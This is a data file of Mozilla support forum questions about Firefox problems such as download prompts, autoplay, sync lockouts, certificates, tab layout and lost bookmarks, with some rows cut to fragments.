How can I make Firefox always ask to download mp4/m4v/mov/webm/etc video files?,"Using Firefox 65, I'm trying to get back a basic functionality I've had for years (prior to Quantum).I have a link to an .m4v video file that I need to download (I don't ever want links directly to m4v, mp4, mov, etc playing in the browser, I need to download these files to my computer). Whenever I click the link, it automatically opens up a blank page and starts playing the video. Nothing I do will give me the 'Ask what to do' prompt. How can I fix this?Things I've tried:Changing the default action to 'Mpeg-4 movie' under Options/Applications to 'Always Ask'. Even if the link is an mp4, it still plays it in the browser.Manually added an entry for .m4v by editing handlers.json, and setting it to 'Always ask'. Still plays in the browser.Set both Mpeg-4 Movie and the manual m4v entry to 'Save File'. Still plays in the browser.Tried doing a 'Save As' while it was playing to just save my file, but Firefox then tries to save the file as 'FileName.m4v.mp4' instead of just 'FileName.m4v'. I'm not sure if it's actually re-wrapping the file into another container, or just arbitrarily adding an extra extension to the filename, but I need it to, by default, save as the file name that is used on the server... (If it's just renaming the file, I can live with this one bug if I can make the rest of the functionality work.)Can anyone offer any tips on this?Can anyone explain an easier way to manually add an extension into the Application section?Here's a test page:http://camendesign.com/code/video_for_everybody/test.htmlUnderneath the thumbnail image/embedded video there direct links to an mp4, ogg video and WebM video.The action I want, when I click on any one of those, is for Firefox to prompt me with a download location to save the file to (the usual 'Always Ask' dialog box). NOTHING should attempt to play in the web browser itself.I've been able to do this with every version of Firefox 'pre-Quantum', but I just can't make the latest version do it...(Another work-around that may seem obvious is to right-click the file name and click 'Save Link As'. While this works on the sample page, it doesn't work on the pages I have to download these videos from... It's a scripted button that sends back the link to the file when clicked on.)"

"How to efficiently clear Cookies and History, yet preserve manually pinned Top Sites?","Hi everyone,Clearing all cookies and history is something that I frequently do. Unfortunately, doing so also removes all Top Sites that I may have manually pinned in new tab (Firefox Home). Do you know of an efficient way to prevent that to happen when clearing absolutely all the rest? Just preserve the pinned tabs, nothing else.I know that in about:config, they also have they special entry: browser.newtabpage.pinned, and I think it does kind of make sense to see these manually pinned tabs more as bookmarks than as temporary cookies, really.Thanks for your time :)"

Changing size on one tab has suddenly started changing the size on another tab for the same website,"If I have two (or more) tabs open for the same website and I want to resize/zoom something on one tab only, the other tab now also changes. As an example, I will have the Guardian news site open with all sizes of text and graphics as I like them. If there is an article open for comments I open this in a second tab and, because the text of the comments is smaller, I increase the size on this tab.Doing that made the text on the second tab a nice size for me but nothing on the first tab changed.Since last night, every time I change the size/zoom on the second tab it now does the same thing on the first tab. I've done nothing different to this laptop nor firefox settings.What's happened?"

How to get rid of weird border on the browser?,"I genuinely don't know what the hell is going on or why every time I download an update for Firefox, SOMETHING has to go wrong. It's incredibly frustrating. But let's get to the point.Last time my Firefox updated, something screwed up, as it often does. This time around, it gives this stupidly thick border around the browser, almost appearing like there's a second, slightly larger browser in the background of the first. Not only is it very unsightly, but it also seems to make it impossible to snap the window into place like I used to do and can still do with any other windowed app. This also makes it impossible to resize the window in general- clicking on the edge of the browser does nothing. I can't resize it at all. This is a huge issue for me.As far as I can tell, it's unrelated to themes or add-ons. I've disabled all my add-ons. I've disabled the dark theme I use. I've opened private browsers. It persists through all of this. I've even tried uninstalling and reinstalling the browser entirely. As you can guess.. literally nothing happened. Still there. Still can't resize or snap. Still utterly useless to me now. I'm genuinely about to just say fuck it, delete it entirely from the computer, and move to Chrome. I've been a fan of Firefox for years, despite it giving me some sort of issue every update, but this might be the one that does me in. Would love a word of advice on how to fix this. Pics are included of what I'm talking about."
How will I receive an Amazon gift card for using Firefox to book a hotel on booking.com?,"In late December, on my Firefox home page, there was a promotion with a link in the footer, indicating that I would receive a $20 Amazon gift card for using booking.com and Firefox to reserve a hotel room. I clicked that link, booked my stay, received a confirmation that clearly showed my reservation had been booked using Firefox, and have completed my hotel stay. In contacting booking.com to inquire when and how I would receive my Amazon gift card, they indicated that they have no relationship with Firefox and agreed to no such promotion.What is going on here? Was this a scam? Who is responsible in this scenario? I would not have used booking.com otherwise. And am now seriously questioning the integrity of Firefox, unless someone makes good on this offer."

Impossible to make my website with HTTPS wíth certificate,"Hello, there is a https:// setting that is destroying my charity project and (since my project is about creating funds for many charities), it's affection many other charities as well.I've got a website called Doelshop.nl which raises free donations for charities. This is done through affiliate marketing, someone buys something through my website (I'm just linking through) and 75% of the commission goes to the charity that the buyer chooses. The buyer doesn't pay anything extra. PROBLEM with Firefox/Google Chrome Many charities have applied (because they can get free donations through their users who are already shopping online), recently we have implemented in our system a function where each project can make their own subdomain. This means, if you have a charity called ABC, you can create ABC.doelshop.nl and automatically you have selected the ABC charity. Very handy for charities, because it's easy promotion. Now here's the problem, we have bought a SSL wildcard certificate to establish https:// connection for all these subdomains. BUT, some are typing into their URL boxes: www.abc.doelshop.nl and this CANNOT be certified. Technically it can if we manually insert every subdomain into multiple certificates, which would cost us thousands of dollars. Also our subdomains are not set, new ones are being created all the time. Both Firefox and Google Chrome now always give an error message when people type in their URL address with 'www.'. People cannot even reach the website, it gives un unsafe warning and shoppers won't donate for free to their charity. We have redirected the 'www.' to 'without www.' but this doesn't help. PLEASE HELP Is there any way where you could help, for example by listing these sub-subdomains as safe? I can give you any kind of openness to prove there is nothing scammy going on. I'm willing to change these domain setups towards Doelshop.nl/abc instead of abc.doelshop.nl but it takes a while. If you could list it as a safe connection in the meantime that would also mean a lot!Instead of using abc.doelshop.nl for testing, you can use https://make-a-wish.doelshop.nl (working) and https://www.make-a-wish.doelshop.nl (unsafe in your browser)"

I'm pretty sure emails to that account are not bouncing. Could you please unlock my account so that I can access my sync account through THAT email, which actually accepts emails as I've tested many times? (For example, this mozilla account is linked to the same email address, for which I received a confirmation email from Mozilla itself a few minutes ago)To make matters worse, I could not delete the account to start afresh, because or an incorrect-password response on the dialog form used to submit the change, Therefore I disconnected and now no longer am able to access that account from any browser. When I attempt to create a new account using the same email address, I am prompted with ""Account exists"", which is understandable. Attempts to reset password ALWAYS result in an instantaneously displayed (with NO delay or pause) error, ""Email was returned"", and no email message ever gets sent from Mozilla, in inbox or spam.I need this corrected immediately. Either resolve this by procedure OR perform and override and delete my account to allow creation of a new account with that SAME email address._________________________________[previous unresolved incident]This is the EXACT same scenario that I have attempted, but unlike the user mentioned below, who apparently was successful in receiving the reset email from Mozilla, I never received an email message, and Mozilla claims that the ""email was just returned"". All transpiring within the last 30 minutes, this exact same behavior has occurred whether I attempt a reset on the iOS device (iPhone Xs) or on the PC from which I have responded to this follow-up inquiry.Something must be constitutionally wrong here, and I assure you that if any Mozilla email had been successfully delivered to the above ISP account, then spam filters would still have allowed examination of such message for my observation and manipulation.That's not happening.

If there's more than one such super-esd, I'd prefer late-40's early-50s (I would prefer a version that's back far enough to support full Java, I like having toolbars, I really dislike how everything has been removed from visible access on toolbars, and is now buried two or three layers under the three-bar menu. But those are preferences, not absolute musts. I realize I may not be able to get back to that. It's more important to get my bookmarks, passwords and cookies than Java.)2. My profile was converted. How do I get my cookies passwords and bookmarks? Browse history is nice too, but I can live without that.3. How do I uninstall EVERYTHING so I will get a clean install? The best idea I've had is to do the uninstall, and then create a new account on that computer, and move all my data from the existing account to the new account. That will take hours, but it may be the best of bad options.4. How do I lock that computer TOTALLY so that I NEVER EVER EVER get another automatic update (except must-do security updates)?Thank you. Firefox really is an easier-to-use browser than Explorer, Edge, or Chrome, but I really can't afford updates. They're too unstable."

"How can I set a map program in Firefox that is independent of the search progam (e.g., Google)?","I like using Google for internet searches, but can't stand the latest version of Google Maps (which is almost impossible to read). It seems that there is no separate selection in Firefox Options to specify the map program that I want, separate from the search program. For example, if I want to use Windows Maps, I have to set the default search program to Bing. If I set the search program to Google, the system defaults to Google maps."
Is there any plan to support in Firefox the web3 extensions like Opera Browser?,"To facilitate the massive adoption of crypto will be necessary to have a better UX allowing the users to interact with crypto currencies natively from the browser.

How does one sign up for mozilla support?,"Hi,I spent quite some time to figure out how to sign up to this mozilla support forum. So far the only way I could sign up is to find the ""Ask a question"" text box on a non-obvious page (https://support.mozilla.org/en-US/questions/new/desktop/other) which eventually got to a ""Register or Sign In"" page. The ""obvious"" place would be a ""Sign Up"" link on the ""Sign In"" page (as is done by virtually any other community forum. There is a link ""Get Community Support"" in the black top banner of the main ""entrance"" page https://support.mozilla.org/en-US/ but this doesn't let one sign up, which I found very confusing and frustrating.If the purpose of this forum is to build a vibrant community of Q&A seekers and providers, then the obstacles implied in the current site design is a major *fail*.I understand that it is necessary to somehow filter new members for ""fake"" accounts and spam-bots, but there are other and better ways (e.g. smart captchas or 3rd device verifications, etc) than to bury the sign-up page in a deeply nested labyrinth of pages.I humbly ask the site-designers to re-think the 'sign-up' policy and re-design the current process or at least give some instructions on the page targeted by the ""Get Community Support"" link, to not discourage potential support-community members like myself.Kind regards,-porl3DPS: obviously I managed to sign-up, so I answered the question essentially myself. Still, I'd like to point out the awkwardness of the current design and hope that others in this forum agree and help to escalate this issue to the responsible decision makers."

Firefox often opening links or tabs as blanks,"Firefox will sometimes load up as blank as well. Hitting home key or refresh doesn't help. It's been frustrating, when clicking on a link or hitting + tab it will open but be blank and not usable. What I mean is if I copy and paste link address into that blank tab it is unresponsive. When it opens a blank link it will show the full and correct link in header but no load.I did read at least one other person had a similar problem. A reset worked for them. I first tried going into safe mode to see if any extensions etc might be the culprit. Problem happened in safe mode. So then I did try the reset. Unfortunately, the problem still happens. One other idea given was to turn off hardware acceleration, which I've done. Didn't help though.The problem is only with firefox. Chrome works and handles links/tabs fine. Even so I ran antivirus and antimalware softwares just in case. Dead end.I'm using 64 bit version of Windows 7."

It would not open in safe mode although I tried something once (no idea what) and it did open briefly to save my bookmarks but then I couldn't get out or back in. I'm at a loss what to do at this point and I really like Firefox. I'm not savvy with computers but I know some and can follow directions. Firefox worked fine until the update and nothing has changed on my computer since that point except downloading Chrome to have a browser."

Now the first two kick up the bookmarks and the last brings up source code. It would even be better if they did nothing, vs. this. Is there a way to tell Firefox to let the default features work?

"Discussion: What functionality would you love added to Pocket the most? (March 10th, 2019)","This is an exact copy of a letter I sent to Pocket today:Dear Pocket,I love Pocket, especially on Firefox, iOS, Android, and Kindle Fire, but I'll wait until I renew my monthly subscription for $4.99 per month. There's so much room for improvement and I have lots of faith in the active development of Pocket, especially on Firefox for Desktop! Just this morning at church, I've thought of many, many ways it can be improved for everybody.(a) Payment methods. -- I'd love to be able to store up to five credit/debit cards, one PayPal account, one Amazon Pay account, and one Google Pay account on my Pocket Premium account so I can easily choose which payment method I want to renew my Pocket Premium subscription with, after Pocket improves its security all around.(b) Editing titles. -- I don't like it that I can't edit titles of pages I've saved in Pocket.(c) Tag character limit. -- I find the limit of 25 characters in tags too restrictive. I think a limit of 50 characters is much better, especially since I use tags like ""active development of firefox"", ""exploring dc, maryland, and virginia"", and ""newer device in 2020 or 2021"".(d) Pocket on game consoles. -- I'd love the Pocket app to be available on PlayStation 4, Xbox One, and the Nintendo Switch so I can read articles from the comfort of my couch.(e) Linking Facebook, Twitter, Yahoo!, and AOL. -- I don't like it that I can only link my Facebook and Twitter accounts on a mobile app for Pocket and not through Firefox, and I'd love Yahoo! and AOL account integration on my Pocket account, along with sign-in to Pocket for all four of those platforms in addition to signing in with Firefox on my laptop.(f) Stacking subscriptions. -- I'd love to add time on my Pocket Premium subscription well in advance of when it needs to be renewed, up to a limit of five years after today just like I can with my Office 365 Personal subscription, which will auto-renew on 3/9/2024 with my PayPal account. I really love being able to ""set it and forget it"" when it comes to auto-renewals for my subscription-based programs and apps on my Dell Inspiron and iPhone.(g) Firefox integration. -- I'd love better Firefox integration with Pocket. For example, it would be great if I could view my Pocket list with the same great user interface on the Pocket website in my Firefox bookmarks library alongside the bookmarks menu, toolbar, and other bookmarks, with the Pocket list being separate from my Firefox bookmarks in those three other categories. In other words, I don't like having to go to getpocket.com to see my Pocket list in Firefox. I want more than one way to get to my Pocket list in Firefox.(h) Grouping articles. -- Similarly like Firefox container tabs, I'd love to group my Pocket list with categories like shopping, banking, news, personal, traveling, and plenty more. I love the suggested tags feature, but it certainly doesn't do everything I need it to on a daily basis, especially not on the iOS, Android and Kindle Fire mobile app for Pocket.(i) Profile picture. -- I don't like it that I can't change my Pocket profile picture in Firefox. I disconnected my Google account from Pocket and then immediately added it back. The profile picture matches my Google account on the iOS app, but still shows the old Google account profile picture when I use Pocket in Firefox on my Dell Inspiron on Windows 10.(j) Duplicate pages. -- I don't like it that there's no notification if I'm about to add a page which is exactly the same as one I've already added in terms of the URL. It would certainly be great to have this as an option I can turn on and off in the Settings page in a browser.(k) Sorting pages. -- I don't like it that I can't sort pages I've saved to Pocket by name like I can with Firefox bookmarks. I also don't like it that I can't auto-sort pages by name like a Firefox add-on called ""Sort Bookmarks"" does for me, with folders before loose pages.(l) Page count. -- I like it that I have the option to show how many pages I have in Pocket on my iOS app in the app's badge count icon, but not in Firefox. Why not on all devices?(m) Public lists. -- I'd love to be able to make my list public as an option with a simple link I can copy and paste into an email. There's nothing I need private from others on my Pocket list. It's just a listing of websites like The Washington Post I always love to read.(n) Errors with some webpages. -- Sometimes, Pocket saves the mobile version instead of the desktop version of websites when I click ""Save to Pocket"" in Firefox on my Inspiron. I never want the mobile version of webpages on my Pocket list. It would be great if I could tell Pocket to always save the desktop version of whatever I want saved to my Pocket list.(o) Internet Archive integration. -- It would be great if Pocket included a button that lets me save a webpage to the Internet Archive, often called the ""Wayback Machine"", just by clicking or tapping on it. I wouldn't mind if this feature was exclusive to Pocket Premium.(p) Two-factor authentication. -- Just like Firefox, I'd love to get two-factor login codes for my Pocket account either by email or authenticator app like Microsoft Authenticator.I just gave you sixteen ways I'd love Pocket Premium very much can be improved for all. I'll pass on the pro-rated refund when my subscription expires on April 10th, 2019, but I'll get another month of Pocket Premium for $4.99 on June 10th, 2019 and see how far the development of Pocket has come in exactly three months from the date of this letter.Please consider at the very least one of my sixteen suggestions to improve Pocket for all.Respectfully,Thomas James Seymour"

increase search bar width,"I have always used a separate Search Bar, and I like it. Yes, I know that a Search Bar can be added or subtracted from the Tool Bar by ""Options/Search/add search bar in toolbar"". And you can hover over the space between the Address Bar and the Tool Bar, and change the width of one vs the other.That's not what I want, and not how FF has worked for years.The Search Bar can be relocated from the middle of the Toolbar to the next line underneath the Toolbar, whatever it's called, by opening a Customize Tab, and simply dragging the Search Bar. Initially it ends up at the left of the page, and then can be moved to the right by placing Flexible Spaces in front of it. I find that I have always liked it placed to the far left. I leave it to the left side because it's my belief that the cursor will be closer to the left when Search is needed. In any case there is no restriction to the horizontal position of this Search Bar. The problem is that FF somehow now in version 65.0.2/64 the Search Bar width is smaller than previously, ~1"" on a 24"" display. This is unacceptable, how can it be change?"

Firefox 66 (macOS) reverting to playing YouTube videos automatically,"I finally some months ago had managed to stop Firefox 63 (plus 64 and 65) from playing videos (i. e. on YouTube) automatically. In the course of finding the solution for this I had been told here in the forum that ""no autoplay"" would become the default in a future version of Firefox.One or two days ago I then read that Firefox 66 would finally do this. Great. However, after updating to Firefox 66 videos on YouTube play again (unlike in my Firefox 65 with modified settings) automatically and with sound - blissfully ignoring the setting ""Block websites from automatically playing sound"" in the Firefox preferences.With all due respect: Is this a joke? It was possible before to disable autoplay, now not anymore - what's the progress here? What is good about disabling the disabling of autoplay? And, no, youtube.com is not in my exceptions list (nothing is).How can this be fixed?"

Warning: potential security risk. Unable to access yahoo.com,"HelloI have had this issue for 3 days now. I am unable to access yahoo mail or yahoo in general because I get warning potential risk ahead message. I had to make twitter account to be able to get in touch with yahoo support but they just offered a yahoo link which, of course, I am unable to open because of ""potential risk ahead"". I tried solutions suggested by people here at mozilla support, like clearing history, cache etc but it didn't work. I also tired accessing yahoo via internet explorer and chrome (installed on my father's laptop, windows 10) Of course same message appears. I am using windows 7 64 bit. I also tried Edge and of course it says yahoo site is not secure. I have never had these kind of problems before. I was always able to access yahoo via FIrefox and other browsers. It's really damn annoying because i see no solution to this damn crap. Also I am unable to upload a 170kb screenshot to show you the issue. Just keeps loading and loading and it doesn't stop.

Multirow on Firefox Quantum,"I am trying very hard to use Firefox Quantum and move on from Firefox 56, and the one thing that most drives me crazy is the single row for tabs.I've tried implementing workarounds with the userChrome.css, such as the one found here: https://github.com/Izheil/Quantum-Nox-Firefox-Dark-Full-Theme/tree/master/Multirow%20and%20other%20functions/Multirow%20tabs — but all my attempts have failed.Does anyone know of another solution?It's been horrible using a browser with only one row for tabs. It's very hard to find the tabs I want and to manage my open tabs, even using the menu which shows all of them. I often have no idea of how many tabs I have open, and I often end up with multiple tabs for the same page because I am not aware that it is already open or because it would take too long to find it.With Firefox 56 and Tab Mix Plus, I usually had around 40 to 50 tabs open most of the time, and when I'm researching stuff this number easily gets to the hundreds for a while. With Firefox Quantum I have been unable to manage my tabs properly: I end up with much more tabs than I really need and it's hard to keep then organized.I feel like I am struggling to save a marriage that can't be saved. I don't want to leave Firefox, but it's becoming unbearable. Feel free to suggest another browser as a solution to my problem."

Now it's run by weak and scared individuals who'll gladly sell our freedom for their own self-preservation.When things go down, you'll feel really dumb that you sold our freedom which ultimately led to our enslavement!

I would like to obviously keep all of my Firefox info, history, bookmarks, etc. and be able to restore them to the computer when it is returned to me, be it the same laptop or a new one. Can someone please instruct me on the proper way to do this?Is it as simple as copying my Profile folder to another drive, and then reinstalling it after I reinstall Firefox back on the laptop (be it my original one or a new one) when it has been returned to me?Do I need to use the Profile Manager?I bought a used Lenovo to use while my Acer is in for repairs. Today, I think that I successfully synced the two of them. (I have a Windows phone and thus no Firefox app for my phone, and could not enter a phone number to ""complete"" the sync as instructed) but it seems to have worked. Will the bookmarks, history, tabs, etc from my Acer disappear from showing up on the Lenovo when the Acer laptop is reset by the factory?

Firefox in Ubuntu causes whole desktop to freeze at least once a day,"I installed Ubuntu 18.04.2 LTS on my MacBookPro three weeks ago. Since then, generally at least once a day, Firefox will cause the whole desktop to freeze, even the shortcuts (to open the terminal for example) do not work anymore and all I can do is force shut down the computer by pressing the power button a few seconds.I already asked a question here : https://askubuntu.com/questions/1129681/youtube-random-crash-audio-keeps-repeating-a-given-sound-unable-to-do-anything Unfortunately, what they recommended - disabling hardware acceleration and installing a new graphic card - did not solve the issue.Since I asked this question there, I also found out that Firefox not only freezes on YouTube, but potentially everywhere. I also tried to create a new profile, deleting all add-ons and even totally removing Firefox and do a fresh installation, but that did also not solve the issue.Strangely, this does only happen in Firefox in Ubuntu, not in OS X or in Windows 8 (installed via BootCamp) where I also use it.Here is a video showing the problem if it can help: https://www.youtube.com/watch?v=YZrK1bsnHCoSo yeah, I don't really see what else it could be and would appreciate your help.Thanks for your support !"

Every time I relaunch Firefox all of my extension data disappears,"Whenever I quit and re-open all of my extension settings (adblock filters, userscripts, etc.) have reset.I've tried restoring my profile from backups and manually changing extension settings, but it all disappears again when I relaunch Firefox.This has only started happening since yesterday when I updated to the latest version (66.0.2, from 65.0.1).Update: I have tried ""refreshing"" Firefox and reinstalling extensions and am still having the same problem.Update 2: I have just uninstalled and removed all trace of Firefox from my system, then re-downloaded, and this is still happening.Update 3: I have now downgraded to 65.0.2 and am no longer having this problem ¯\_(ツ)_/¯"

Videos no longer auto-play when I switch to their tab,"HiIt seems a recent change from firefox has screwed up youtube and other website video playback behaviour.It used to be that if I opened a video in another tab it would stay paused, and then play as soon as I switch to that tab.Recently (within the last week) it started to keep the videos paused even when I switch, so I have to then manually press on the video's play button.If I reload the page with the video that was paused this way, it becomes paused again.When paused, the video shows an enlarged low-res preview.Additionally I have to press on the video twice if it was in a non-active tab that was re-loaded after I re-opened firefox.In short:Old Behaviour:open video page in another tab->switch to tab->video plays automaticallyNew Behaviour:open video page in another tab->switch to tab->video is paused->click on video->video playsopen video page in another tab->close firefox->open firefox->switch to tab->video is paused->click on video->video still paused->click again->video playsI've tried this on youtube, vimeo, dailymotion.I've tried it on two different PCs connected with the same FF accountI've tried this in Safe-ModeI've tried this in a Private WindowMy firefox version is 66.0.2My Windows version is 10 Pronoticed one suspicious thing in about:configapp.normandy.startupRolloutPrefs.media.autoplay.default = 1"
Video DownloadHelper with companion app uses only one Firefox sub-process.,"I am using Video Download Helper with companion app, when downloading videos, the DownloadHelper will uses only one process of Firefox with very high CPU and memory usage. . Ans cause it does not take advantage of all the CPU cores it is very slow, and uses high memory for that process and will make all tabs in Firefox slow.It seems that this process is the core process for Firefox, although it is a sub-process. It is the process that almost doesn't uses GPU memory.When finished, if I killed this Firefox process to clean memory, cause it will just accumulate the memory in that specific process, all the tabs in the Firefox will crash and can't be refreshed, until I close Firefox and open it again.Usually when I kill a Firefox process that is not responding, it will crash a few tabs and they can be refreshed after that.Is there anyway that can make the companion app uses all processes for Firefox, so it will distribute the CPU usage to all cores, and if used a high memory it will be distribute the memory to all process and will be easier to clean."
Slower video streaming rate with Firefox (FF) v66.0.2 (.41Mbs) vs. Google Chrome v73.0 (1.54 Mbs),I use Windows-7 Home Premium (2009) service pack 1 OS on a 64 bit computer (PC) using a VGA connection to display device (TV) and I use latest version of both browsers.

I do have Windows Media Player already loaded (and running?). How can I increase live video streaming rate with FF ?

Disable F11,"Hello,is it possible to disable F11 key for enabling disabling full screen or set it to another combination like Alt + F11?My problem is, that i am using citrix html 5 client in firefox.

But unfortunatly whenever i use it also Firefox switches the full screen and then the citrix client adjusts the resolution which durates a few seconds. And thats really annoying. Using another key in the terminal application is not possible. The APplication uses F1 - F24 by double using the F1-F12 Keys.regards"

How can I force re-prompting for client certificates?,"I am testing authentication with client certificates (self-made CA and certs/keys). Everything works correctly. However, if I do not choose the right certificate in the first try, or add client certificates after trying the secure website (and not getting access), I am not re-prompted with choosing client certificates, I get access denied. The only solution I have found so far is 'refresh' firefox. Then I have to add my own certs again, which is somewhat tedious, but then I am asked again for client certs and it works. Is there a way to make Firefox ""forget"" that it got denied the previous time? Or force rep-prompting?"

Two versions of firefox on computer - How do I get rid of one?,"I just noticed that I have an old (63.0.3) and a new (66.0.3) version of Firefox on my computer. I have no idea when or how this happened. Seems to work fine at the moment.One is Mozilla Firefox 63.0.3 (x64 en-US) (170 MB).One is Mozilla Firefox 66.0.3 (x64 en-US) (175 MB). So my guess is this happened a while ago.Both show up when I look at Apps & Features.Both are listed in Revo uninstaller.There are two identical Firefox icons.If I open one and check the version number in the program, it does show a different number depending on which icon I clicked to open the program. So there are definitely two versions.They are sharing information. They open the same pages in several tabs that I had open when I closed the the program the last time.I want to get rid of one but don't want to lose my many settings, bookmarks, etc. I don't want to risk everything by just Uninstalling the old version, unless I can be sure that it is safe.Everything on my HP-PC is up to date.Any ideas? Thanks!"

i close on empty tab but it doesnt open on empty tab,"tl;dr when i close firefox with a newly created empty tab and open it again said tab is not opened So i got into the habit of using the session restore function instead of bookmarks. Then the problem arose that I often had tabs open that started loading and even though I don't need them in that exact moment. The solution is/was obvious closing firefox with an empty tab, so that when i open it doesn't load (and the setting that tabs only load when I select them).And with the newest update said tactic doesnt work anymore, the empty tabs aren't there when I open Firefox.-Ufo"

Why does Firefox create Other Bookmarks Category and retain multiple copies of empty folders,"I'm trying to organize my bookmarks, and under ""Other Bookmarks"" I have MULTIPLE (up to >10 copies) of empty folders. I don't even need an ""Other Bookmarks"" category, just Bookmarks Toolbar, and Mobile Bookmarks. Now, I have to delete all these empty folders manually, one at a time. There is no reason to even have an ""Other Bookmarks"" category; most people organize their bookmarks into folders AND HAVING THEM IN THE BOOKMARKS TOOLBAR, where they're easily accessible with a drop-down menu, under the category the user has created for the Bookmarks Toolbar Folders can hold everything at the user's fingertips. I've tried selecting multiple empty folders at a time to delete them, but Firefox doesn't delete multiple empty folders at a time. How do these folders even come into existence? I just want it to stop, and that's why I don't use Firefox on my PC, and only use it on my Android devices BECAUSE my PREFERRED browser (Vivaldi) isn't available for Android or other mobile devices. I specifically chose both of these browsers because I can still have (on PC, anyway) a menu bar, and other browsers don't have that. (I wouldn't even use it on my Android device, except that I can access my desktop bookmarks. The Mobile version is sooo lacking in features that I like about the desktop version.) Help me get rid of these empty folders that continue to appear in my desktop version of Firefox.Thank you,Joan Johnson"

Is this punishment for doing an update?,"After doing an update it would have been nice to receive a notification to let me know that I should restart the browser but instead I am being prevented from opening a link in a new tab just because I have updated the browser among other things in the background. This is will only serve to discourage me from doing an update while I'm using the browser. Now it says that I could have restored the session but as you tell by the little purple mask in the top right corner of the image I've uploaded- I was using the browser in Private-mode so that won't happen and I will get a ""Firefox is having trouble restoring your tabs"" message if I did a reboot. I had typed whole bunch of stuff in one tab and I had ended up loosing that because I couldn't open a link in a new tab (using Ctrl+left-Click). Now even if a person isn't in Private-mode there are still plenty of reasons for not doing a reboot right after an update like it's possible that a person has to wait for internet access forcing a reboot like this will only make people curse the developers. In my case obviously I was in a private session and I wanted to finish working on something before doing a reboot and in the mean time I should be able to use the browser normally like would be able to use it if I hadn't done an update. In short people shouldn't be prevented from opening a link in new tab just because they've updated the browser. That should go without saying.Just to mess with the user there's a nice little cartoon on the left with an unplugged extension cord."

Have iOS ad blocker's stopped working for Firefox?,"locking this thread as duplicate, please continue at https://support.mozilla.org/en-US/que.../1257763Starting a few days ago, it appears as if Firefox on my iPhone is infected with malware. I keep getting full page pop up ads, and other ads covering parts of the screen that I have to keep closing. I deactivated and then reactivated the ad blockers to troubleshoot, to no avail. The blockers still work for Safari, but not for Firefox.Has anyone else had this issue?If the ad blockers downloaded from the iOS store no longer work, are there other ad blocker's that could be installed directly into the browser, as opposed to via an app? By the way, when I checked my Firefox settings, to my astonishment, tracking protection was turned off in private mode, though still enabled in regular mode. That's why I think this is malware, not just ads. My settings were changed behind my back. Thanks a lot for any help you can offer."

Bookmarks suddenly got deleted and I'm wondering why,"OK, I reinstalled Windows and everything else few days ago. Upon reinstalling Firefox and logging into the account, it synced and added all bookmarks, extensions, addons and options back to how they were before they got corrupted by ransomware I stupidly got (which is reason I deleted everything from my PC in the 1st place).

Great.But 10ish minutes ago it suddenly deleted all bookmarks I made prior to data corruption few days ago. Both from PC and the Android. While using the PC version. Just, poof, gone. As well as folder structures and separators. Restore finds nothing but default ones so that doesn't help. Thought it had ""deleted bookmarks section"" but that's apparently on Opera.Everything else remained the same. Options, extensions, customised layout, you name it. Except ~1000 bookmarks which I forgot to backup after successful resync because, well, there's a lot of stuff to do when you reinstall everything on main PC and neverfuckingever did I have an issue with Firefox's version of a sync.So, what the hell happend there? Tech-wise. I can guesstimate why it happened on PC but why on Android as well? Makes no sense to me for the latter.EDIT: I know about restore and how it works as well as backups which I failed to make. I know I made mistakes and well, shit happens. I'm not looking for solution to the problem (which would be nice but I doubt it exist) but an explaination on why it happend on both my devices from a technical standpoint."

New Firefox won't separate settings for NEW PAGE vs HOMEPAGE!,"For years I have set my ""Homepage"" to a particular site, and set my ""Open New Window"" to blank, and I don't use Tabs.

Stylish lost its webpage edits, Reddit Enhancement Suite's setting information got reset, the theme I was using wasn't active and I had to turn it back on, and the toolbar(not sure what you call it) had reset back to the default appearance with the flexible space and what not.

How to recover data from *memory* cache (not disk)?,"My 11 year old typed in a big blog entry on Wix for a school thing and then accidentally deleted it. He's one of those kids that really has to work to write much, so he's *really* discouraged and it's worth some effort on my part to recover. Wix has no recovery tools I can find, and there is nothing in the disk cache. However when I fired up about:cache I did find several potentially interesting files in the ""memory"" section. When clicking on them, I get a page with the title ""Cache entry information"", a bunch of header info etc, and then a big chunk of what looks like hex data with checksums or something e.g:00000000: 1f 8b 08 00 00 00 00 00 00 03 ec bd db 92 1b 57 ...............W00000010: 96 a6 f9 2a 50 5c 8c b2 7a 18 91 7e 84 bb 73 6c ...*P\..z..~..sl00000020: ac 8c a2 a4 4c 96 e9 34 22 2b d3 ba 2b db 68 7e ....L..4""+..+.h~etc...To complicate matters further the machine he was on is an old unstable one, so to capture the data before it died again (and presumably wiped the memory cache), I went through the cache and saved all of the likely looking files.Some of them are pretty big, so I am optimistic there is something in there at least, but I can't figure out how to access them. Naively it seems like there should be some way to get FF to interpret them as arriving from a server, rather than just displaying the data as text the way it does if I load the file. I've also tried editing out the decorative HTML from the cache file I saved and making a file that looks like a server response, using only the headers & pre-formatted text from the cache file, but no luck. Any advice?thanks"

"Firefox remembers login names, but does not remember passwords","Hi Team,I have just installed Linux Mint 19 alongside Windows 7, and installed Linux Firefox 67. Windows also has 67.I pointed the Linux Firefox to the Windows Profile file, and it looked exactly like the Windows version.When I went to access websites that have stored login names and password, the Login names were there, but the passwords did not show. When I entered a password again, and asked it to Save, it proceeded and logged in. When I logged off, and tried to login again, the Login name was there, but no password - had to enter it again.I have looked through all of the relevant posts in Support, and tried several options, but none work. Would appreciate some assistance is solving this one please. Thanks plml"

Firefox no longer opens my home page automatically !! It will open if I manually enter the URL.,"I've been using Firefox since it first appeared. It's been my default browser since. However, the recent updates have badly broken it, to the point that I may be forced to switch to something else, like (choke) Chrome. Namely, when I open Firefox, no homepage nor URL appears. I can click the 'home' icon, and get there fine. Also, since Firefox is myu default browser in Windows10, if I click on a hotlink from an email, the same thing happens...Firefox opens, but the passed URL does not happen. Just a blank screen in both cases. I've looked through lots of online help, but NOTHING has helped at all.Thoughts ?"
